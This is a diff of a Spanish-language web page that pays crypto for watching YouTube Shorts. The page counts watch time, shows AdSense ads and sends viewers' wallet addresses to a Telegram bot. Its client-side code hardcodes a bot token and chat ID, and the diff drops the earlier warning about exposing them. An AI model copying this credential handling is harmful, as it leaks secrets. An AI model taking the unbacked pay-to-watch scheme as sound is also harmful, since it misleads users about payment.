@@ -2,502 +2,130 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>CHC • Ver Shorts y Cobrar</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
-  <meta name="color-scheme" content="dark light">
-  <style>
-    :root { color-scheme: dark; }
-    .glass { background: rgba(255,255,255,0.06); backdrop-filter: blur(10px); }
-    .marquee { white-space: nowrap; overflow: hidden; }
-    .marquee span { display: inline-block; padding-left: 100%; animation: marquee 18s linear infinite; }
-    @keyframes marquee { 0% { transform: translate(0,0) } 100% { transform: translate(-100%,0) } }
-  </style>
+  <title>Reproductor de Shorts - CHC/CHUN</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <script src="https://www.youtube.com/iframe_api"></script>
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8137092478828495"
+     crossorigin="anonymous"></script>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
 </head>
-<body class="min-h-screen bg-gray-950 text-gray-100">
-  <!-- Header -->
-  <header class="p-4 md:p-6 border-b border-gray-800 sticky top-0 bg-gray-950/80 backdrop-blur z-20">
-    <div class="max-w-6xl mx-auto flex items-center justify-between gap-4">
-      <div class="flex items-center gap-3">
-        <div class="w-10 h-10 rounded-2xl bg-yellow-400 flex items-center justify-center text-black font-extrabold">CH</div>
-        <div>
-          <h1 class="text-xl md:text-2xl font-bold">Ver Shorts y Cobrar — CHC / CHUN</h1>
-          <p class="text-xs md:text-sm text-gray-400">Canal: <a class="underline hover:text-yellow-400" target="_blank" href="https://www.youtube.com/@CharlyUNAM-Charly4k/shorts">@CharlyUNAM‑Charly4k</a></p>
-        </div>
+<body class="bg-gray-100 text-gray-900">
+
+  <div class="flex flex-col md:flex-row h-screen max-w-screen mx-auto">
+    <!-- Panel del reproductor -->
+    <div class="flex-1 flex flex-col items-center justify-start p-2">
+      <div class="w-full max-w-md">
+        <div id="player" class="w-full aspect-video rounded-2xl shadow-md bg-black"></div>
       </div>
-      <button id="cobrarBtn" class="bg-yellow-400 text-black font-semibold px-4 py-2 rounded-xl hover:bg-yellow-300 transition">💸 Cobrar por tiempo de vista</button>
+
+      <!-- Anuncio AdSense -->
+      <div class="w-full max-w-md my-4">
+        <ins class="adsbygoogle"
+             style="display:block"
+             data-ad-client="ca-pub-8137092478828495"
+             data-ad-slot="1234567890"
+             data-ad-format="auto"
+             data-full-width-responsive="true"></ins>
+        <script>
+          (adsbygoogle = window.adsbygoogle || []).push({});
+        </script>
+      </div>
+
+      <!-- Botón de enviar -->
+      <div class="mt-2 w-full max-w-md">
+        <input id="wallet" type="text" placeholder="Tu wallet CHC/CHUN"
+               class="w-full p-2 rounded-lg border border-gray-300 focus:ring focus:ring-blue-400">
+        <button onclick="enviarWallet()"
+                class="mt-2 w-full p-2 rounded-lg bg-blue-600 text-white hover:bg-blue-700 shadow">
+          Enviar
+        </button>
+      </div>
     </div>
-  </header>
 
-  <div class="max-w-6xl mx-auto mt-4 px-4">
-    <div class="glass rounded-2xl p-4 text-sm text-gray-300">
-      ⚠️ Este demo envía la dirección a un bot de Telegram directamente desde el navegador. Para producción, usa un proxy seguro (ej. Cloudflare Worker/Netlify Function) para ocultar tu token. Revisa el bloque de código al final.
-    </div>
-  </div>
-
-  <main class="max-w-6xl mx-auto px-4 py-6 grid md:grid-cols-3 gap-6">
-    <!-- Player + Cola -->
-    <section class="md:col-span-2 space-y-4">
-      <!-- Reproductor -->
-      <div class="glass rounded-2xl p-3">
-        <div id="player" class="w-full aspect-[9/16] max-h-[80vh]"></div>
-      </div>
-
-      <!-- Controles de carga de Shorts (ACTUALIZADO: lista precargada y botones de reproducir) -->
-      <div class="glass rounded-2xl p-4 space-y-3">
-        <h2 class="font-semibold">Lista de Shorts del canal (precargada)</h2>
-        <p class="text-sm text-gray-300">Aquí están los videos que cargaste. Usa <strong>Reproducir</strong> para iniciar uno, <strong>Agregar a cola</strong> para añadir más, y <strong>Cargar todo</strong> para añadir la lista completa a la cola.</p>
-
-        <div class="flex flex-col gap-3">
-          <div class="flex gap-3">
-            <input id="shortUrl" type="url" placeholder="https://www.youtube.com/shorts/VIDEO_ID" class="text-black px-3 py-2 rounded-lg flex-1" />
-            <button id="loadBtn" class="bg-white text-black font-semibold px-4 py-2 rounded-lg hover:bg-gray-200">Cargar</button>
-            <button id="addQueueBtn" class="bg-gray-800 border border-gray-700 px-4 py-2 rounded-lg hover:bg-gray-700">Agregar a cola</button>
-            <button id="loadAllBtn" class="bg-gray-700 border border-gray-600 px-4 py-2 rounded-lg hover:bg-gray-600">Cargar todo</button>
-          </div>
-
-          <div class="text-xs text-gray-400">Shorts precargados. Puedes modificarlos o pegar nuevos enlaces.</div>
-        </div>
-
-        <!-- Lista visual con botones reproducir y contadores -->
-        <div class="mt-3">
-          <ul id="masterList" class="space-y-2 text-sm"></ul>
-        </div>
-      </div>
-
-      <!-- Cola -->
-      <div class="glass rounded-2xl p-4 space-y-3">
-        <div class="flex items-center justify-between">
-          <h2 class="font-semibold">Cola de reproducción</h2>
-          <div class="text-xs text-gray-400">Auto‑avanza al terminar un Short</div>
-        </div>
-        <ul id="queueList" class="space-y-2 text-sm"></ul>
-      </div>
-
-      <div class="marquee text-xs text-gray-500"><span>Reproduciendo contenido educativo y de entretenimiento — Gracias por apoyar el ecosistema CHC/CHUN ✨</span></div>
-    </section>
-
-    <!-- Cobro / Wallet -->
-    <aside class="space-y-4">
-      <div class="glass rounded-2xl p-4 space-y-3">
-        <h2 class="font-semibold">Cobrar por tiempo de vista</h2>
-        <p class="text-sm text-gray-300">Al presionar <strong>Cobrar</strong> se mostrará un anuncio y, después, podrás enviar tu wallet WLD/World Chain para recibir CHC o CHUN. No mostramos el monto ganado.</p>
-        <button class="bg-yellow-400 text-black font-semibold px-4 py-2 rounded-lg hover:bg-yellow-300 w-full" id="cobrarBtn2">💸 Cobrar</button>
-      </div>
-
-      <div class="glass rounded-2xl p-4 space-y-3">
-        <h3 class="font-semibold">Tu Wallet (elige una opción)</h3>
-
-        <!-- Opción 1: Copiar desde UNO -->
-        <div class="space-y-2">
-          <label class="text-sm text-gray-300">1) Copiar desde UNO (recomendado)</label>
-          <div class="flex gap-2">
-            <a target="_blank" href="https://worldcoin.org/mini-app?app_id=app_a4f7f3e62c1de0b9490a5260cb390b56" class="px-3 py-2 rounded-lg bg-gray-800 border border-gray-700 hover:bg-gray-700">Abrir UNO para copiar</a>
-            <button id="pegarDesdePortapapeles" class="px-3 py-2 rounded-lg bg-gray-800 border border-gray-700 hover:bg-gray-700">Pegar desde portapapeles</button>
-          </div>
-        </div>
-
-        <!-- Opción 2: Manual -->
-        <div id="manualWalletSection" class="mt-2 flex flex-col items-stretch">
-          <p class="mb-2 text-sm">🔁 Pega tu dirección WLD aquí:</p>
-          <input type="text" id="manualWallet" placeholder="0x… tu dirección en World Chain" class="text-black px-4 py-2 rounded mb-2 w-full">
-          <button onclick="enviarWallet()" class="bg-yellow-500 hover:bg-yellow-600 px-6 py-2 rounded text-black font-bold">📤 Enviar</button>
-        </div>
-
-        <p id="statusMsg" class="text-sm text-green-400 min-h-[1.5rem]"></p>
-      </div>
-
-      <div class="glass rounded-2xl p-4 text-xs text-gray-400">
-        <p>Después de enviar tu wallet verás este mensaje: <em>“En breve se te enviarán tus criptomonedas (máximo 24 horas).”</em></p>
-      </div>
-    </aside>
-  </main>
-
-  <!-- Modal de anuncio -->
-  <div id="adModal" class="fixed inset-0 hidden items-center justify-center bg-black/70 z-30">
-    <div class="glass rounded-2xl p-6 max-w-md w-full space-y-4">
-      <h3 class="text-lg font-semibold">Anuncio</h3>
-      <p class="text-sm text-gray-300">Gracias por apoyar. Este espacio está reservado para tu creatividad (banner, video o HTML de anunciante).</p>
-      <div class="rounded-xl border border-gray-800 p-4 text-center">[<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8137092478828495"
-     crossorigin="anonymous"></script>]</div>
-      <button id="cerrarAnuncio" class="w-full bg-white/90 text-black font-semibold px-4 py-2 rounded-xl hover:bg-white">Continuar</button>
+    <!-- Panel de lista -->
+    <div class="w-full md:w-1/3 p-2 bg-white shadow-inner overflow-y-auto">
+      <h2 class="text-lg font-bold mb-2">Lista de Videos</h2>
+      <div id="lista-videos" class="space-y-2"></div>
     </div>
   </div>
-
-  <footer class="px-4 py-8 border-t border-gray-800 text-center text-xs text-gray-500">
-    © <span id="year"></span> CHC / CHUN — Hecho con 💛 para la comunidad.
-  </footer>
 
   <script>
-    // =====================
-    // CONFIGURACIÓN
-    // =====================
-    const telegramToken = '8010490851:AAGXRC8_OlcfCeL53VgJ_ALqmbRuT691Wlk';
-    const chatId = '7613604212';
-    const SECURE_PROXY_URL = '' // p.ej. 'https://tu-dominio.workers.dev/send'
-
-    // =====================
-    // Datos iniciales: precargamos los tres Shorts que mandaste
-    // =====================
-    const initialShorts = [
-      'https://www.youtube.com/shorts/HS81XKWh1N4',
-      'https://www.youtube.com/shorts/hK2lwzhp5sc',
-      'https://www.youtube.com/shorts/hh_4iOFkSOs'
+    let player;
+    let listaMaestra = [
+      { id: "jhlF5N3KbUg", titulo: "Short 1", segundos: 0, reproducciones: 0 },
+      { id: "c6gi6IP6ay4", titulo: "Short 2", segundos: 0, reproducciones: 0 },
+      { id: "tVj0ZTS4WF4", titulo: "Short 3", segundos: 0, reproducciones: 0 }
     ];
-
-    // =====================
-    // YOUTUBE IFRAME API
-    // =====================
-    let player = null;
-    let isPlaying = false;
-    let lastTick = 0;
-    let totalWatchSeconds = 0;
-    const watchedIds = new Set();
-
-    // Data por video: { id, url, secondsWatched, plays }
-    const master = [];
-    const queue = [];
-
-    const queueList = document.getElementById('queueList');
-    const masterList = document.getElementById('masterList');
+    let videoActual = null;
+    let intervalo = null;
 
     function onYouTubeIframeAPIReady() {
-      player = new YT.Player('player', {
-        height: '100%',
-        width: '100%',
-        videoId: null,
-        playerVars: {
-          autoplay: 0,
-          controls: 1,
-          rel: 0,
-          modestbranding: 1,
-          enablejsapi: 1,
-          playsinline: 1,
-          origin: location.origin
-        },
-        events: {
-          'onStateChange': onPlayerStateChange,
-          'onReady': () => { initMasterList(); }
-        }
+      player = new YT.Player("player", {
+        height: "360",
+        width: "640",
+        videoId: listaMaestra[0].id,
+        events: { "onStateChange": onPlayerStateChange }
       });
+      renderLista();
     }
 
-    function initMasterList() {
-      // Inicializa master con los iniciales
-      initialShorts.forEach(u => {
-        const id = parseYouTubeId(u);
-        if (!id) return;
-        master.push({ id, url: u, secondsWatched: 0, plays: 0, isPlaying: false });
-      });
-      renderMasterList();
-    }
-
-    function renderMasterList() {
-      masterList.innerHTML = '';
-      master.forEach((v, idx) => {
-        const li = document.createElement('li');
-        li.className = 'flex items-center justify-between bg-gray-900 border border-gray-800 rounded-lg px-3 py-2';
-        li.innerHTML = `
-          <div class="flex items-center gap-3 text-xs">
-            <div class="w-10 h-10 bg-gray-800 rounded flex items-center justify-center">#${idx+1}</div>
-            <div>
-              <div class="font-medium text-gray-200">${v.id}</div>
-              <div class="text-xs text-gray-400">Segundos vistos: <span class="sec" data-idx="${idx}">${Math.round(v.secondsWatched)}</span> · Veces reproducido: <span class="plays" data-idx="${idx}">${v.plays}</span></div>
+    function renderLista() {
+      const cont = document.getElementById("lista-videos");
+      cont.innerHTML = "";
+      listaMaestra.forEach((v, idx) => {
+        cont.innerHTML += `
+          <div class="p-2 border rounded-lg flex flex-col bg-gray-50">
+            <span class="font-semibold">${v.titulo}</span>
+            <span class="text-sm text-gray-600">Visto: ${v.segundos}s | Reproducciones: ${v.reproducciones}</span>
+            <div class="mt-1 flex space-x-2">
+              <button onclick="reproducir(${idx})" class="px-2 py-1 bg-green-500 text-white rounded">Reproducir</button>
+              <button onclick="agregarACola(${idx})" class="px-2 py-1 bg-yellow-500 text-white rounded">Agregar a cola</button>
             </div>
-          </div>
-          <div class="flex items-center gap-2">
-            <button class="play-btn text-xs px-2 py-1 rounded bg-gray-800 hover:bg-gray-700" data-id="${v.id}">▶️ Reproducir</button>
-            <button class="add-queue-btn text-xs px-2 py-1 rounded bg-gray-800 hover:bg-gray-700" data-id="${v.id}">➕ Agregar a cola</button>
           </div>`;
-        masterList.appendChild(li);
       });
     }
 
-    function renderQueue() {
-      queueList.innerHTML = '';
-      queue.forEach((id, idx) => {
-        const li = document.createElement('li');
-        li.className = 'flex items-center justify-between bg-gray-900 border border-gray-800 rounded-lg px-3 py-2';
-        li.innerHTML = `
-          <div class="flex items-center gap-2 text-xs">
-            <span class="px-2 py-0.5 rounded bg-gray-800">${idx+1}</span>
-            <code class="text-gray-300">${id}</code>
-          </div>
-          <div class="flex items-center gap-2">
-            <button class="text-xs px-2 py-1 rounded bg-gray-800 hover:bg-gray-700" data-play="${id}">▶️</button>
-            <button class="text-xs px-2 py-1 rounded bg-gray-800 hover:bg-gray-700" data-remove="${idx}">🗑️</button>
-          </div>`;
-        queueList.appendChild(li);
-      });
+    function reproducir(idx) {
+      videoActual = idx;
+      player.loadVideoById(listaMaestra[idx].id);
     }
 
-    function parseYouTubeId(url) {
-      try {
-        const u = new URL(url);
-        if (u.hostname === 'youtu.be') return u.pathname.slice(1);
-        if (u.searchParams.get('v')) return u.searchParams.get('v');
-        const shorts = u.pathname.match(/\/shorts\/([a-zA-Z0-9_-]{5,})/);
-        if (shorts) return shorts[1];
-      } catch (_) {}
-      if (/^[a-zA-Z0-9_-]{5,}$/i.test(url)) return url;
-      return null;
+    function agregarACola(idx) {
+      alert("El video " + listaMaestra[idx].titulo + " se agregó a la cola (falta implementar cola).");
     }
 
-    function loadVideoById(id) {
-      if (!player || !id) return;
-      player.loadVideoById({ videoId: id, startSeconds: 0, suggestedQuality: 'highres' });
-    }
-
-    function addToQueue(id) {
-      queue.push(id);
-      renderQueue();
-    }
-
-    function playNextInQueue() {
-      if (queue.length === 0) return;
-      const next = queue.shift();
-      renderQueue();
-      loadVideoById(next);
-    }
-
-    // =================================
-    // Seguimiento de tiempo y reproducciones por video
-    // =================================
-    function onPlayerStateChange(e) {
-      const state = e.data;
-      const id = player.getVideoData()?.video_id;
-      if (!id) return;
-
-      const v = master.find(x => x.id === id) || { id, secondsWatched: 0, plays: 0 };
-      if (!master.find(x => x.id === id)) master.push(v);
-
-      if (state === YT.PlayerState.PLAYING) {
-        // Marca reproducción
-        if (!v.isPlaying) {
-          v.plays = (v.plays || 0) + 1;
-          v.isPlaying = true;
-          updateMasterUI(v.id);
+    function onPlayerStateChange(event) {
+      if (event.data === YT.PlayerState.PLAYING) {
+        if (videoActual !== null) listaMaestra[videoActual].reproducciones++;
+        if (!intervalo) {
+          intervalo = setInterval(() => {
+            if (videoActual !== null) {
+              listaMaestra[videoActual].segundos++;
+              renderLista();
+            }
+          }, 1000);
         }
-        isPlaying = true;
-        lastTick = performance.now();
-        watchedIds.add(id);
-        tick();
-      } else if (state === YT.PlayerState.PAUSED) {
-        // Acumula tiempo
-        if (v.isPlaying) accrueForId(v.id);
-        v.isPlaying = false;
-        isPlaying = false;
-      } else if (state === YT.PlayerState.ENDED) {
-        if (v.isPlaying) accrueForId(v.id);
-        v.isPlaying = false;
-        isPlaying = false;
-        playNextInQueue();
-      }
-    }
-
-    function tick() {
-      if (!isPlaying) return;
-      const now = performance.now();
-      const delta = (now - lastTick) / 1000; // s
-      totalWatchSeconds += delta;
-      lastTick = now;
-
-      // asigna segundos al video activo
-      const id = player.getVideoData()?.video_id;
-      if (id) {
-        const v = master.find(x => x.id === id);
-        if (v) {
-          v.secondsWatched = (v.secondsWatched || 0) + delta;
-          updateMasterUI(id);
-        }
-      }
-      requestAnimationFrame(tick);
-    }
-
-    function accrueForId(id) {
-      // si hay tiempo pendiente lo actualiza (ya se hace en tick, esto es por si pause rápido)
-      const v = master.find(x => x.id === id);
-      if (v) updateMasterUI(id);
-    }
-
-    function updateMasterUI(id) {
-      const idx = master.findIndex(x => x.id === id);
-      if (idx === -1) return;
-      const elSec = document.querySelector(`.sec[data-idx=\"${idx}\"]`);
-      const elPlays = document.querySelector(`.plays[data-idx=\"${idx}\"]`);
-      if (elSec) elSec.textContent = Math.round(master[idx].secondsWatched);
-      if (elPlays) elPlays.textContent = master[idx].plays;
-    }
-
-    // =====================
-    // UI handlers
-    // =====================
-    document.getElementById('loadBtn').addEventListener('click', () => {
-      const url = document.getElementById('shortUrl').value.trim();
-      const id = parseYouTubeId(url);
-      if (!id) return alert('URL o ID inválido.');
-      loadVideoById(id);
-    });
-
-    document.getElementById('addQueueBtn').addEventListener('click', () => {
-      const url = document.getElementById('shortUrl').value.trim();
-      const id = parseYouTubeId(url);
-      if (!id) return alert('URL o ID inválido.');
-      addToQueue(id);
-      document.getElementById('shortUrl').value = '';
-    });
-
-    document.getElementById('loadAllBtn').addEventListener('click', () => {
-      // agrega todos los del master a la cola
-      master.forEach(v => addToQueue(v.id));
-      renderQueue();
-    });
-
-    masterList.addEventListener('click', (e) => {
-      const playId = e.target.getAttribute('data-id');
-      if (playId) {
-        loadVideoById(playId);
-        return;
-      }
-      const addId = e.target.getAttribute('data-id');
-      if (addId) addToQueue(addId);
-    });
-
-    queueList.addEventListener('click', (e) => {
-      const playId = e.target.getAttribute('data-play');
-      const removeIdx = e.target.getAttribute('data-remove');
-      if (playId) {
-        loadVideoById(playId);
-      } else if (removeIdx !== null) {
-        queue.splice(Number(removeIdx), 1);
-        renderQueue();
-      }
-    });
-
-    // Botones Cobrar -> muestra anuncio y luego wallet
-    const cobrarBtn = document.getElementById('cobrarBtn');
-    const cobrarBtn2 = document.getElementById('cobrarBtn2');
-    const adModal = document.getElementById('adModal');
-    const cerrarAnuncio = document.getElementById('cerrarAnuncio');
-
-    function abrirAnuncio() { adModal.classList.remove('hidden'); adModal.classList.add('flex'); }
-    function cerrarAnuncioFn() { adModal.classList.add('hidden'); adModal.classList.remove('flex'); }
-
-    cobrarBtn.addEventListener('click', abrirAnuncio);
-    cobrarBtn2.addEventListener('click', abrirAnuncio);
-    cerrarAnuncio.addEventListener('click', cerrarAnuncioFn);
-
-    document.getElementById('pegarDesdePortapapeles').addEventListener('click', async () => {
-      try {
-        const text = await navigator.clipboard.readText();
-        document.getElementById('manualWallet').value = text.trim();
-      } catch (err) {
-        alert('No se pudo leer el portapapeles. Pega manualmente.');
-      }
-    });
-
-    // Envío de wallet a Telegram + mensaje final (incluye stats por video)
-    async function enviarAlDestino(payload) {
-      const perVideo = master.map(v => `${v.id}: segundos=${Math.round(v.secondsWatched)}, reproducciones=${v.plays}`).join('
-');
-      const msg = `Nuevo cobro por tiempo de vista
-
-` +
-        `Wallet: ${payload.wallet}
-` +
-        `Segundos vistos (total): ${Math.round(payload.seconds)}
-` +
-        `Videos vistos: ${Array.from(watchedIds).join(', ') || 'n/d'}
-` +
-        `Detalle por video:
-${perVideo}
-` +
-        `User Agent: ${navigator.userAgent}
-` +
-        `Fecha: ${new Date().toISOString()}`;
-
-      try {
-        if (SECURE_PROXY_URL) {
-          const r = await fetch(SECURE_PROXY_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ text: msg })
-          });
-          if (!r.ok) throw new Error('Proxy respondió con error');
-        } else {
-          const url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${encodeURIComponent(chatId)}&text=${encodeURIComponent(msg)}`;
-          const r = await fetch(url, { method: 'GET' });
-          if (!r.ok) throw new Error('Telegram respondió con error');
-        }
-        return true;
-      } catch (err) {
-        console.error(err);
-        return false;
+      } else {
+        clearInterval(intervalo);
+        intervalo = null;
       }
     }
 
     async function enviarWallet() {
-      const input = document.getElementById('manualWallet');
-      const wallet = (input.value || '').trim();
-      if (!/^0x[0-9a-fA-F]{40}$/.test(wallet)) {
-        return alert('Ingresa una dirección válida (0x… de 42 caracteres).');
-      }
-      // Asegura acumular segundos recientes
-      if (isPlaying) accrue();
-      const ok = await enviarAlDestino({ wallet, seconds: totalWatchSeconds });
-      const status = document.getElementById('statusMsg');
-      if (ok) {
-        status.textContent = 'En breve se te enviarán tus criptomonedas (máximo 24 horas).';
-        status.classList.remove('text-red-400');
-        status.classList.add('text-green-400');
-      } else {
-        status.textContent = 'No se pudo completar el envío. Intenta de nuevo más tarde.';
-        status.classList.remove('text-green-400');
-        status.classList.add('text-red-400');
-      }
+      const wallet = document.getElementById("wallet").value.trim();
+      if (!wallet) return alert("Ingresa tu wallet primero");
+      const total = listaMaestra.reduce((a, v) => a + v.segundos, 0);
+      const detalles = listaMaestra.map(v => `${v.titulo}: ${v.segundos}s (${v.reproducciones}x)`).join("\n");
+
+      const mensaje = `⏱ Tiempo total visto: ${total}s\n📺 Detalle:\n${detalles}\n💳 Wallet: ${wallet}`;
+      
+      await fetch(`https://api.telegram.org/bot${"8010490851:AAGXRC8_OlcfCeL53VgJ_ALqmbRuT691Wlk"}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: "7613604212", text: mensaje })
+      });
+      alert("Datos enviados correctamente ✅");
     }
-
-    function accrue() {
-      if (!isPlaying) return;
-      const now = performance.now();
-      totalWatchSeconds += (now - lastTick) / 1000;
-      lastTick = now;
-      const id = player.getVideoData()?.video_id;
-      if (id) {
-        const v = master.find(x => x.id === id);
-        if (v) {
-          v.secondsWatched = (v.secondsWatched || 0) + ((now - lastTick) / 1000);
-          updateMasterUI(id);
-        }
-      }
-    }
-
-    // Exponer función
-    window.enviarWallet = enviarWallet;
-
-    document.getElementById('year').textContent = new Date().getFullYear();
   </script>
-
-  <!--
-  =====================
-  OPCIÓN SEGURA (RECOMENDADA)
-  =====================
-  Ejemplo de Cloudflare Worker (proxy) para ocultar el token:
-
-  export default {
-    async fetch(request, env) {
-      if (request.method !== 'POST') return new Response('Method Not Allowed', { status: 405 });
-      const { text } = await request.json();
-      const token = env.TELEGRAM_BOT_TOKEN; // almacena en Variables de entorno
-      const chatId = env.TELEGRAM_CHAT_ID;
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-      const r = await fetch(url, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ chat_id: chatId, text }) });
-      return new Response(await r.text(), { status: r.status, headers: { 'Access-Control-Allow-Origin': '*' } });
-    }
-  }
-
-  Luego asigna la URL a SECURE_PROXY_URL en el frontend.
-  -->
 </body>
 </html>
